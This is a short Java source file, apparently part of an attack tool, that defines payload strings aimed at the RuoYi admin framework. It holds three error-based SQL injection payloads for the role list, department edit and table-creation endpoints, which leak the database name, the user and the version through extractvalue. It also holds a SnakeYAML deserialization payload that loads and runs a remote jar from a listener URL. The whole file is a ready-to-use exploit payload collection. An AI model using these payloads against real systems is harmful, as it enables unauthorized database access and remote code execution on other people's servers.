package com.liev.clouds.payload;

/**
 * @author Revcloud
 * @since 2024/8/29 9:46
 */
public class RuoYiPayload {

    public static final String SQL_system_role_list = "pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))";

    public static final String SQL_system_dept_edit = "deptId=100&parentId=0&parentName=%E6%97%A0&deptName=%E8%8B%A5%E4%BE%9D%E7%A7%91%E6%8A%80&orderNum=0&leader=%E8%8B%A5%E4%BE%9D&phone=15888888888&email=ry%40qq.com&status=0&ordernum=1&ancestors=0)or(extractvalue(1,concat((select%20user()))));#";

    public static final String SQL_tool_gen_createTable = "sql=CREATE+table+ss1+as+SELECT%2F**%2F*+FROM+sys_job+WHERE+1%3D1+union%2F**%2FSELECT%2F**%2Fextractvalue(1%2Cconcat(0x7e%2C(select%2F**%2Fversion())%2C0x7e))%3B";

    public static final String RCE_snakeyaml = "org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8888/yaml-payload.jar\"]]]]')";
}
